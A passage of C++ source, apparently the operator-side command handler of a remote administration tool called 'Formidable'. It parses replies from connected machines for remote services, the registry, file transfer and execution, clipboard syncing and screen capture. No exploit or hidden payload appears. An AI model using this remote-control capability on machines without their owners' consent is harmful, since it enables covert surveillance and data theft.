            BITMAPFILEHEADER* pBmpFileHeader = (BITMAPFILEHEADER*)pkg->data;
            BITMAPINFOHEADER* pBmpInfoHeader = (BITMAPINFOHEADER*)(pkg->data + sizeof(BITMAPFILEHEADER));
            BYTE* pBmpData = (BYTE*)(pkg->data + pBmpFileHeader->bfOffBits);

            HDC hDC = GetDC(NULL);
            HBITMAP hBitmap = CreateDIBitmap(hDC, pBmpInfoHeader, CBM_INIT, pBmpData, (BITMAPINFO*)pBmpInfoHeader, DIB_RGB_COLORS);
            ReleaseDC(NULL, hDC);

            if (hBitmap) {
                // 清理旧位图
                if (g_WindowPreviews.count(client->hWindowDlg)) {
                    HBITMAP hOld = g_WindowPreviews[client->hWindowDlg];
                    if (hOld) DeleteObject(hOld);
                }
                g_WindowPreviews[client->hWindowDlg] = hBitmap;

                // 刷新预览控件
                HWND hPreview = GetDlgItem(client->hWindowDlg, IDC_STATIC_WIN_PREVIEW);
                InvalidateRect(hPreview, NULL, FALSE);
            }
        }
    }
}

void CommandHandler::HandleServiceList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hServiceDlg && IsWindow(client->hServiceDlg)) {
        std::string data(pkg->data, pkg->arg1);
        
        // 检查是否是控制命令的响应 (OK/FAIL)
        if (data == "OK" || data == "FAIL") {
            if (data == "OK") {
                // 操作成功，自动刷新列表
                Formidable::CommandPkg refreshPkg = { 0 };
                refreshPkg.cmd = Formidable::CMD_SERVICE_LIST;
                refreshPkg.arg1 = 0;
                
                size_t bodySize = sizeof(Formidable::CommandPkg);
                std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
                Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
                memcpy(header->flag, "FRMD26?", 7);
                header->originLen = (int)bodySize;
                header->totalLen = (int)buffer.size();
                memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &refreshPkg, bodySize);
                
                SendDataToClient(client, buffer.data(), (int)buffer.size());
            } else {
                MessageBoxW(client->hServiceDlg, L"服务操作失败，请检查权限。", L"错误", MB_ICONERROR);
            }
            return;
        }

        HWND hList = GetDlgItem(client->hServiceDlg, IDC_LIST_SERVICE);
        ListView_DeleteAllItems(hList);
        SendMessage(hList, WM_SETREDRAW, FALSE, 0);

        std::stringstream ss(data);
        std::string line;
        int index = 0;

        while (std::getline(ss, line)) {
            if (line.empty()) continue;
            
            // 格式: 服务名|显示名|状态|启动类型|二进制路径|服务类型
            size_t p1 = line.find('|');
            size_t p2 = line.find('|', p1 + 1);
            size_t p3 = line.find('|', p2 + 1);
            size_t p4 = line.find('|', p3 + 1);
            size_t p5 = line.find('|', p4 + 1);
            
            if (p1 == std::string::npos || p2 == std::string::npos || p3 == std::string::npos || 
                p4 == std::string::npos || p5 == std::string::npos) continue;

            std::wstring wName = Utils::StringHelper::UTF8ToWide(line.substr(0, p1));
            std::wstring wDisp = Utils::StringHelper::UTF8ToWide(line.substr(p1 + 1, p2 - p1 - 1));
            std::wstring wStatus = Utils::StringHelper::UTF8ToWide(line.substr(p2 + 1, p3 - p2 - 1));
            std::wstring wStartType = Utils::StringHelper::UTF8ToWide(line.substr(p3 + 1, p4 - p3 - 1));
            std::wstring wPath = Utils::StringHelper::UTF8ToWide(line.substr(p4 + 1, p5 - p4 - 1));
            std::wstring wServiceType = Utils::StringHelper::UTF8ToWide(line.substr(p5 + 1));

            LVITEMW lvi = { 0 };
            lvi.mask = LVIF_TEXT | LVIF_PARAM;
            lvi.iItem = index;
            lvi.pszText = (LPWSTR)wName.c_str();
            lvi.lParam = index;
            int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);

            ListView_SetItemText(hList, idx, 1, (LPWSTR)wDisp.c_str());
            ListView_SetItemText(hList, idx, 2, (LPWSTR)wStatus.c_str());
            ListView_SetItemText(hList, idx, 3, (LPWSTR)wStartType.c_str());
            ListView_SetItemText(hList, idx, 4, (LPWSTR)wServiceType.c_str());
            ListView_SetItemText(hList, idx, 5, (LPWSTR)wPath.c_str());
            
            index++;
        }
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
    }
}

void CommandHandler::HandleSystemInfo(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }
    
    // 如果收到系统信息且包含 ClientInfo，则更新。系统信息模块也可返回额外细节
    if (pkg->arg1 == sizeof(Formidable::ClientInfo)) {
        HandleClientInfo(clientId, (const Formidable::ClientInfo*)pkg->data);
    }
}

void CommandHandler::HandleRegistryData(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hRegistryDlg && IsWindow(client->hRegistryDlg)) {
        HWND hTree = GetDlgItem(client->hRegistryDlg, IDC_TREE_REGISTRY);
        HWND hList = GetDlgItem(client->hRegistryDlg, IDC_LIST_REGISTRY_VALUES);
        
        const char* pData = pkg->data;
        int dataLen = pkg->arg1;

        if (pkg->arg2 == 1) { // Keys for Tree
             HTREEITEM hSelected = TreeView_GetSelection(hTree);
             if (hSelected) {
                 // 删除旧子项
                 HTREEITEM hChild = TreeView_GetChild(hTree, hSelected);
                 while (hChild) {
                     HTREEITEM hNext = TreeView_GetNextSibling(hTree, hChild);
                     TreeView_DeleteItem(hTree, hChild);
                     hChild = hNext;
                 }
                 
                 // 获取父节点的 lParam (根键索引)
                 TVITEMW tviParent = { 0 };
                 tviParent.mask = TVIF_PARAM;
                 tviParent.hItem = hSelected;
                 uint32_t rootIdx = 0;
                 if (TreeView_GetItem(hTree, &tviParent)) {
                     rootIdx = (uint32_t)tviParent.lParam;
                 }

                 if (dataLen >= 8) {
                     uint32_t count = 0;
                     memcpy(&count, pData, 4);
                     const char* p = pData + 8;
                     const char* end = pData + dataLen;

                     SendMessage(hTree, WM_SETREDRAW, FALSE, 0);
                     for (uint32_t i = 0; i < count && p < end; ++i) {
                         if (p + 4 > end) break;
                         uint32_t len = 0;
                         memcpy(&len, p, 4); p += 4;
                         if (p + len > end) break;
                         std::string keyName(p, len); p += len;
                         
                         std::wstring wKey = Utils::StringHelper::UTF8ToWide(keyName);
                         TVINSERTSTRUCTW tvis = { 0 };
                         tvis.hParent = hSelected;
                         tvis.hInsertAfter = TVI_LAST;
                         tvis.item.mask = TVIF_TEXT | TVIF_CHILDREN | TVIF_PARAM;
                         tvis.item.pszText = (LPWSTR)wKey.c_str();
                         tvis.item.cChildren = 1;
                         tvis.item.lParam = (LPARAM)0x80000000; 
                         TreeView_InsertItem(hTree, &tvis);
                     }
                     TVITEMW tviNode = { 0 };
                     tviNode.mask = TVIF_CHILDREN;
                     tviNode.hItem = hSelected;
                     tviNode.cChildren = (count > 0) ? 1 : 0;
                     TreeView_SetItem(hTree, &tviNode);
                     SendMessage(hTree, WM_SETREDRAW, TRUE, 0);
                     if (count > 0) {
                         TreeView_Expand(hTree, hSelected, TVE_EXPAND);
                     }
                 }
             }
        } else if (pkg->arg2 == 2) { // Values for List
            ListView_DeleteAllItems(hList);
            
            // Binary Format Parsing: [Count:4] ([Type:4][NameLen:4][Name][DataLen:4][Data])...
            if (dataLen >= 4) {
                uint32_t count = 0;
                memcpy(&count, pData, 4);
                const char* p = pData + 4;
                const char* end = pData + dataLen;
                
                SendMessage(hList, WM_SETREDRAW, FALSE, 0);
                for (uint32_t i = 0; i < count && p < end; ++i) {
                    if (p + 4 > end) break;
                    uint32_t type = 0;
                    memcpy(&type, p, 4); p += 4;

                    if (p + 4 > end) break;
                    uint32_t nameLen = 0;
                    memcpy(&nameLen, p, 4); p += 4;
                    if (p + nameLen > end) break;
                    std::string name(p, nameLen); p += nameLen;

                    if (p + 4 > end) break;
                    uint32_t dataLen = 0;
                    memcpy(&dataLen, p, 4); p += 4;
                    if (p + dataLen > end) break;
                    std::string data(p, dataLen); p += dataLen;

                    std::wstring wName = Utils::StringHelper::UTF8ToWide(name);
                    std::wstring wData = Utils::StringHelper::UTF8ToWide(data);
                    
                    // 类型映射
                    std::wstring wType;
                    switch (type) {
                    case REG_SZ: wType = L"REG_SZ"; break;
                    case REG_EXPAND_SZ: wType = L"REG_EXPAND_SZ"; break;
                    case REG_BINARY: wType = L"REG_BINARY"; break;
                    case REG_DWORD: wType = L"REG_DWORD"; break;
                    case REG_DWORD_BIG_ENDIAN: wType = L"REG_DWORD_BIG_ENDIAN"; break;
                    case REG_LINK: wType = L"REG_LINK"; break;
                    case REG_MULTI_SZ: wType = L"REG_MULTI_SZ"; break;
                    case REG_RESOURCE_LIST: wType = L"REG_RESOURCE_LIST"; break;
                    case REG_FULL_RESOURCE_DESCRIPTOR: wType = L"REG_FULL_RESOURCE_DESCRIPTOR"; break;
                    case REG_RESOURCE_REQUIREMENTS_LIST: wType = L"REG_RESOURCE_REQUIREMENTS_LIST"; break;
                    case REG_QWORD: wType = L"REG_QWORD"; break;
                    default: wType = L"Unknown"; break;
                    }

                    LVITEMW lvi = { 0 };
                    lvi.mask = LVIF_TEXT | LVIF_PARAM;
                    lvi.iItem = i;
                    lvi.pszText = (LPWSTR)wName.c_str();
                    lvi.lParam = i;
                    int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);
                    
                    ListView_SetItemText(hList, idx, 1, (LPWSTR)wType.c_str());
                    ListView_SetItemText(hList, idx, 2, (LPWSTR)wData.c_str());
                }
                SendMessage(hList, WM_SETREDRAW, TRUE, 0);
            }
        }
    }
}

void CommandHandler::HandleDriveList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hFileDlg && IsWindow(client->hFileDlg)) {
        std::string* payload = new std::string(pkg->data, pkg->arg1);
        PostMessageW(client->hFileDlg, Formidable::UI::WM_FILE_UPDATE_DRIVES, 0, (LPARAM)payload);
        PostMessageW(client->hFileDlg, Formidable::UI::WM_FILE_LOADING_STATE, 0, 0);
    }
}

void CommandHandler::HandleFileList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hFileDlg && IsWindow(client->hFileDlg)) {
        std::string* payload = new std::string(pkg->data, pkg->arg1);
        PostMessageW(client->hFileDlg, Formidable::UI::WM_FILE_UPDATE_LIST, 0, (LPARAM)payload);
        PostMessageW(client->hFileDlg, Formidable::UI::WM_FILE_LOADING_STATE, 0, 0);
    }
}


void CommandHandler::HandleProcessKill(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::string status(pkg->data, pkg->arg1);
    if (status != "OK") {
        MessageBoxW(g_hMainWnd, L"终止进程失败", L"错误", MB_OK | MB_ICONERROR);
    }
}

void CommandHandler::HandleFileData(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hFileDownload != INVALID_HANDLE_VALUE) {
        DWORD dwWritten = 0;
        uint32_t arg2 = pkg->arg2;
        if (arg2 & kEncryptFlag) {
            uint32_t chunkIndex = (arg2 & ~kEncryptFlag);
            std::vector<char> tmp(pkg->data, pkg->data + pkg->arg1);
            XorCryptBuffer(tmp.data(), pkg->arg1, chunkIndex);
            WriteFile(client->hFileDownload, tmp.data(), (DWORD)tmp.size(), &dwWritten, NULL);
        } else {
            WriteFile(client->hFileDownload, pkg->data, pkg->arg1, &dwWritten, NULL);
        }

        // Update progress
        client->currentDownloadSize += pkg->arg1;
        if (client->totalDownloadSize > 0) {
            uint64_t now = GetTickCount64();
            bool shouldUpdate = false;
            {
                std::lock_guard<std::mutex> lock(s_progressMutex);
                if (now - s_lastProgressTick[clientId] >= 100) {
                    s_lastProgressTick[clientId] = now;
                    shouldUpdate = true;
                }
            }

            int progress = (int)((client->currentDownloadSize * 100) / client->totalDownloadSize);
            if (shouldUpdate || progress >= 100) {
                PostMessageW(client->hFileDlg, WM_UPDATE_PROGRESS, progress, (LPARAM)client->currentDownloadSize);
            }
        }
    }
}

void CommandHandler::HandleFileDownload(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    std::string status(pkg->data, pkg->arg1);
    if (status == "FINISH") {
        if (client->hFileDownload != INVALID_HANDLE_VALUE) {
            CloseHandle(client->hFileDownload);
            client->hFileDownload = INVALID_HANDLE_VALUE;
            
            // Finish progress
            PostMessageW(client->hFileDlg, WM_UPDATE_PROGRESS, 100, (LPARAM)client->currentDownloadSize);
            
            MessageBoxW(client->hFileDlg, L"文件下载完成", L"提示", MB_OK);
        }
    } else if (status == "OPEN_FAILED" || status == "Cannot open file for reading") {
        if (client->hFileDownload != INVALID_HANDLE_VALUE) {
            CloseHandle(client->hFileDownload);
            client->hFileDownload = INVALID_HANDLE_VALUE;
        }
        MessageBoxW(client->hFileDlg, L"远程文件无法打开，下载失败", L"错误", MB_ICONERROR);
    } else if (status == "PERMISSION_DENIED") {
        if (client->hFileDownload != INVALID_HANDLE_VALUE) {
            CloseHandle(client->hFileDownload);
            client->hFileDownload = INVALID_HANDLE_VALUE;
        }
        MessageBoxW(client->hFileDlg, L"权限不足，下载被拒绝", L"错误", MB_ICONERROR);
    }
}

void CommandHandler::HandleFileUpload(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (!client || !client->hFileDlg || !IsWindow(client->hFileDlg)) return;
    std::string status(pkg->data, pkg->arg1);
    if (status == "READY") {
        HWND hStatusBar = GetDlgItem(client->hFileDlg, IDC_STATUS_FILE_BAR);
        if (hStatusBar) SendMessageW(hStatusBar, WM_SETTEXT, 0, (LPARAM)L"开始上传文件...");
        return;
    }
    if (status == "FINISH") {
        MessageBoxW(client->hFileDlg, L"文件上传完成", L"提示", MB_OK | MB_ICONINFORMATION);
        PostMessageW(client->hFileDlg, WM_COMMAND, IDM_FILE_REFRESH, 0);
        return;
    }
    if (status == "INVALID_PATH") {
        MessageBoxW(client->hFileDlg, L"路径无效，无法上传", L"错误", MB_OK | MB_ICONERROR);
        return;
    }
    if (status == "ERROR") {
        MessageBoxW(client->hFileDlg, L"上传初始化失败", L"错误", MB_OK | MB_ICONERROR);
        return;
    }
    if (!status.empty()) {
        std::wstring reason = Formidable::Utils::StringHelper::UTF8ToWide(status);
        MessageBoxW(client->hFileDlg, reason.c_str(), L"上传失败", MB_OK | MB_ICONERROR);
    }
}

void CommandHandler::HandleFileDelete(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (!client || !client->hFileDlg || !IsWindow(client->hFileDlg)) return;
    std::string data(pkg->data, pkg->arg1);
    if (data == "SUCCESS") {
        MessageBoxW(client->hFileDlg, L"删除成功", L"提示", MB_OK | MB_ICONINFORMATION);
        PostMessageW(client->hFileDlg, WM_COMMAND, IDM_FILE_REFRESH, 0);
        return;
    }
    if (data == "FAILED") {
        MessageBoxW(client->hFileDlg, L"删除失败", L"错误", MB_OK | MB_ICONERROR);
        return;
    }
    if (data == "INVALID_PATH") {
        MessageBoxW(client->hFileDlg, L"路径无效，无法删除", L"错误", MB_OK | MB_ICONERROR);
        return;
    }
    if (data.rfind("OK|", 0) == 0) {
        std::vector<std::string> parts;
        size_t start = 0;
        while (true) {
            size_t pos = data.find('|', start);
            if (pos == std::string::npos) {
                parts.push_back(data.substr(start));
                break;
            }
            parts.push_back(data.substr(start, pos - start));
            start = pos + 1;
        }
        if (parts.size() >= 3) {
            std::wstring ok = Formidable::Utils::StringHelper::UTF8ToWide(parts[1]);
            std::wstring fail = Formidable::Utils::StringHelper::UTF8ToWide(parts[2]);
            std::wstring msg = L"成功: " + ok + L"\r\n失败: " + fail;
            MessageBoxW(client->hFileDlg, msg.c_str(), L"删除结果", MB_OK | MB_ICONINFORMATION);
            PostMessageW(client->hFileDlg, WM_COMMAND, IDM_FILE_REFRESH, 0);
            return;
        }
    }
    if (!data.empty()) {
        std::wstring reason = Formidable::Utils::StringHelper::UTF8ToWide(data);
        MessageBoxW(client->hFileDlg, reason.c_str(), L"删除失败", MB_OK | MB_ICONERROR);
    }
}

void CommandHandler::HandleFileRename(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (!client || !client->hFileDlg || !IsWindow(client->hFileDlg)) return;
    std::string data(pkg->data, pkg->arg1);
    if (data == "SUCCESS") {
        PostMessageW(client->hFileDlg, WM_COMMAND, IDM_FILE_REFRESH, 0);
        return;
    }
    if (data == "FAILED") {
        MessageBoxW(client->hFileDlg, L"重命名失败", L"错误", MB_OK | MB_ICONERROR);
        return;
    }
    if (data.rfind("OK|", 0) == 0) {
        std::vector<std::string> parts;
        size_t start = 0;
        while (true) {
            size_t pos = data.find('|', start);
            if (pos == std::string::npos) {
                parts.push_back(data.substr(start));
                break;
            }
            parts.push_back(data.substr(start, pos - start));
            start = pos + 1;
        }
        if (parts.size() >= 3) {
            std::wstring ok = Formidable::Utils::StringHelper::UTF8ToWide(parts[1]);
            std::wstring fail = Formidable::Utils::StringHelper::UTF8ToWide(parts[2]);
            std::wstring msg = L"成功: " + ok + L"\r\n失败: " + fail;
            MessageBoxW(client->hFileDlg, msg.c_str(), L"重命名结果", MB_OK | MB_ICONINFORMATION);
            PostMessageW(client->hFileDlg, WM_COMMAND, IDM_FILE_REFRESH, 0);
            return;
        }
    }
    if (!data.empty()) {
        std::wstring reason = Formidable::Utils::StringHelper::UTF8ToWide(data);
        MessageBoxW(client->hFileDlg, reason.c_str(), L"重命名失败", MB_OK | MB_ICONERROR);
    }
}

void CommandHandler::HandleFileRun(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (!client || !client->hFileDlg || !IsWindow(client->hFileDlg)) return;
    std::string data(pkg->data, pkg->arg1);
    if (data == "SUCCESS") {
        MessageBoxW(client->hFileDlg, L"执行成功", L"提示", MB_OK | MB_ICONINFORMATION);
        return;
    }
    if (data == "FAILED") {
        MessageBoxW(client->hFileDlg, L"执行失败", L"错误", MB_OK | MB_ICONERROR);
        return;
    }
    if (!data.empty()) {
        std::wstring reason = Formidable::Utils::StringHelper::UTF8ToWide(data);
        MessageBoxW(client->hFileDlg, reason.c_str(), L"执行失败", MB_OK | MB_ICONERROR);
    }
}

void CommandHandler::HandleFileMkdir(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (!client || !client->hFileDlg || !IsWindow(client->hFileDlg)) return;
    std::string data(pkg->data, pkg->arg1);
    if (data == "SUCCESS") {
        PostMessageW(client->hFileDlg, WM_COMMAND, IDM_FILE_REFRESH, 0);
        return;
    }
    if (data == "FAILED") {
        MessageBoxW(client->hFileDlg, L"创建文件夹失败", L"错误", MB_OK | MB_ICONERROR);
        return;
    }
    if (data == "INVALID_PATH") {
        MessageBoxW(client->hFileDlg, L"路径无效，无法创建文件夹", L"错误", MB_OK | MB_ICONERROR);
        return;
    }
    if (!data.empty()) {
        std::wstring reason = Formidable::Utils::StringHelper::UTF8ToWide(data);
        MessageBoxW(client->hFileDlg, reason.c_str(), L"创建文件夹失败", MB_OK | MB_ICONERROR);
    }
}

static std::wstring FormatFileAttributesText(DWORD attr) {
    std::wstring text;
    if (attr & FILE_ATTRIBUTE_DIRECTORY) text += L"目录 ";
    if (attr & FILE_ATTRIBUTE_READONLY) text += L"只读 ";
    if (attr & FILE_ATTRIBUTE_HIDDEN) text += L"隐藏 ";
    if (attr & FILE_ATTRIBUTE_SYSTEM) text += L"系统 ";
    if (attr & FILE_ATTRIBUTE_ARCHIVE) text += L"存档 ";
    if (attr & FILE_ATTRIBUTE_COMPRESSED) text += L"压缩 ";
    if (attr & FILE_ATTRIBUTE_ENCRYPTED) text += L"加密 ";
    if (text.empty()) text = L"普通";
    return text;
}

void CommandHandler::HandleFileSize(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::string data(pkg->data, pkg->arg1);
    if (data.rfind("OK|", 0) == 0) {
        std::vector<std::string> parts;
        size_t start = 0;
        while (true) {
            size_t pos = data.find('|', start);
            if (pos == std::string::npos) {
                parts.push_back(data.substr(start));
                break;
            }
            parts.push_back(data.substr(start, pos - start));
            start = pos + 1;
        }
        if (parts.size() >= 7) {
            std::wstring path = Formidable::Utils::StringHelper::UTF8ToWide(parts[1]);
            std::wstring size = Formidable::Utils::StringHelper::UTF8ToWide(parts[2]);
            DWORD attr = (DWORD)strtoul(parts[3].c_str(), nullptr, 10);
            std::wstring attrText = FormatFileAttributesText(attr);
            std::wstring ctime = Formidable::Utils::StringHelper::UTF8ToWide(parts[4]);
            std::wstring atime = Formidable::Utils::StringHelper::UTF8ToWide(parts[5]);
            std::wstring mtime = Formidable::Utils::StringHelper::UTF8ToWide(parts[6]);
            std::wstring msg = L"路径: " + path +
                L"\r\n大小: " + size + L" B" +
                L"\r\n属性: " + attrText +
                L"\r\n创建时间: " + ctime +
                L"\r\n访问时间: " + atime +
                L"\r\n修改时间: " + mtime;
            MessageBoxW(g_hMainWnd, msg.c_str(), L"远程属性", MB_OK | MB_ICONINFORMATION);
            return;
        }
    }
    if (data.rfind("ERROR|", 0) == 0) {
        std::wstring reason = Formidable::Utils::StringHelper::UTF8ToWide(data.substr(6));
        MessageBoxW(g_hMainWnd, reason.c_str(), L"获取属性失败", MB_OK | MB_ICONERROR);
    } else if (data == "FAILED") {
        MessageBoxW(g_hMainWnd, L"获取属性失败", L"错误", MB_OK | MB_ICONERROR);
    }
}

void CommandHandler::HandleFileCompress(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength, bool compress) {
    std::string data(pkg->data, pkg->arg1);
    std::wstring title = compress ? L"压缩" : L"解压";
    if (data == "SUCCESS") {
        MessageBoxW(g_hMainWnd, (title + L"完成").c_str(), title.c_str(), MB_OK | MB_ICONINFORMATION);
        return;
    }
    if (data == "FAILED") {
        MessageBoxW(g_hMainWnd, (title + L"失败").c_str(), title.c_str(), MB_OK | MB_ICONERROR);
        return;
    }
    if (data == "INVALID_PATH") {
        MessageBoxW(g_hMainWnd, L"路径无效", title.c_str(), MB_OK | MB_ICONERROR);
        return;
    }
    if (data.rfind("OK|", 0) == 0) {
        std::vector<std::string> parts;
        size_t start = 0;
        while (true) {
            size_t pos = data.find('|', start);
            if (pos == std::string::npos) {
                parts.push_back(data.substr(start));
                break;
            }
            parts.push_back(data.substr(start, pos - start));
            start = pos + 1;
        }
        if (parts.size() >= 3) {
            std::wstring ok = Formidable::Utils::StringHelper::UTF8ToWide(parts[1]);
            std::wstring fail = Formidable::Utils::StringHelper::UTF8ToWide(parts[2]);
            std::wstring msg = L"成功: " + ok + L"\r\n失败: " + fail;
            MessageBoxW(g_hMainWnd, msg.c_str(), title.c_str(), MB_OK | MB_ICONINFORMATION);
            return;
        }
    }
}

void CommandHandler::HandleFilePreview(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::string data(pkg->data, pkg->arg1);
    if (data.rfind("ERROR|", 0) == 0) {
        std::wstring reason = Formidable::Utils::StringHelper::UTF8ToWide(data.substr(6));
        MessageBoxW(g_hMainWnd, reason.c_str(), L"预览失败", MB_OK | MB_ICONERROR);
        return;
    }
    if (data.rfind("TEXT|", 0) == 0) {
        std::wstring content = Formidable::Utils::StringHelper::UTF8ToWide(data.substr(5));
        if (content.size() > 6000) {
            content = content.substr(0, 6000) + L"...";
        }
        MessageBoxW(g_hMainWnd, content.c_str(), L"预览内容", MB_OK | MB_ICONINFORMATION);
        return;
    }
    if (data.rfind("BIN|", 0) == 0) {
        std::wstring info = Formidable::Utils::StringHelper::UTF8ToWide(data.substr(4));
        MessageBoxW(g_hMainWnd, info.c_str(), L"二进制预览", MB_OK | MB_ICONINFORMATION);
        return;
    }
    std::wstring raw = Formidable::Utils::StringHelper::UTF8ToWide(data);
    MessageBoxW(g_hMainWnd, raw.c_str(), L"预览内容", MB_OK | MB_ICONINFORMATION);
}

void CommandHandler::HandleFileHistory(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::string data(pkg->data, pkg->arg1);
    if (data == "EMPTY") {
        MessageBoxW(g_hMainWnd, L"未找到历史记录", L"历史记录", MB_OK | MB_ICONINFORMATION);
        return;
    }
    if (data.rfind("ERROR|", 0) == 0) {
        std::wstring reason = Formidable::Utils::StringHelper::UTF8ToWide(data.substr(6));
        MessageBoxW(g_hMainWnd, reason.c_str(), L"历史记录失败", MB_OK | MB_ICONERROR);
        return;
    }
    std::wstring content = Formidable::Utils::StringHelper::UTF8ToWide(data);
    if (content.size() > 8000) {
        content = content.substr(0, 8000) + L"...";
    }
    MessageBoxW(g_hMainWnd, content.c_str(), L"历史记录", MB_OK | MB_ICONINFORMATION);
}

void CommandHandler::HandleFileMonitor(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }
    if (!client || !client->hFileDlg || !IsWindow(client->hFileDlg)) return;
    std::string data(pkg->data, pkg->arg1);
    std::wstring text = Formidable::Utils::StringHelper::UTF8ToWide(data);
    HWND hStatusBar = GetDlgItem(client->hFileDlg, IDC_STATUS_FILE_BAR);
    if (hStatusBar) {
        std::wstring msg = L"监控事件: " + text;
        SendMessageW(hStatusBar, WM_SETTEXT, 0, (LPARAM)msg.c_str());
    }
}

void CommandHandler::HandleClipboard(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::string text(pkg->data, pkg->arg1);
    std::wstring wText = Utils::StringHelper::UTF8ToWide(text);
    
    if (OpenClipboard(g_hMainWnd)) {
        EmptyClipboard();
        size_t size = (wText.size() + 1) * sizeof(wchar_t);
        HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, size);
        if (hMem) {
            void* p = GlobalLock(hMem);
            if (p) {
                memcpy(p, wText.c_str(), size);
                GlobalUnlock(hMem);
                SetClipboardData(CF_UNICODETEXT, hMem);
            } else {
                GlobalFree(hMem);
            }
        }
        CloseClipboard();
        AddLog(L"剪贴板", L"已同步远程剪贴板内容到本地");
    }
}

void CommandHandler::HandleScreenCapture(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    const UINT WM_APP_DESKTOP_FRAME = WM_APP + 220;
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hDesktopDlg && IsWindow(client->hDesktopDlg)) {
        HWND hStatic = GetDlgItem(client->hDesktopDlg, IDC_STATIC_SCREEN);
        if (hStatic && pkg->arg1 > 0) {
            
            // 解析协议
            bool isDiff = (pkg->arg2 == 1);
            int x = 0, y = 0, w = 0, h = 0;
            BYTE* pData = (BYTE*)pkg->data;
            DWORD dataLen = pkg->arg1;

            if (isDiff) {
                if (dataLen < 16) return;
                memcpy(&x, pData, 4);
                memcpy(&y, pData + 4, 4);
                memcpy(&w, pData + 8, 4);
                memcpy(&h, pData + 12, 4);
                pData += 16;
                dataLen -= 16;
            }

            // 解码图像数据
            HBITMAP hFragment = NULL;
            bool isBmp = (dataLen > 2 && pData[0] == 'B' && pData[1] == 'M');
            if (isBmp) {
                BITMAPFILEHEADER* pBmpFileHeader = (BITMAPFILEHEADER*)pData;
                BITMAPINFOHEADER* pBmpInfoHeader = (BITMAPINFOHEADER*)(pData + sizeof(BITMAPFILEHEADER));
                BYTE* pBits = (BYTE*)pData + pBmpFileHeader->bfOffBits;
                HDC hdc = GetDC(hStatic);
                hFragment = CreateDIBitmap(hdc, pBmpInfoHeader, CBM_INIT, pBits, (BITMAPINFO*)pBmpInfoHeader, DIB_RGB_COLORS);
                ReleaseDC(hStatic, hdc);
            } else {
                HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, dataLen);
                if (hGlobal) {
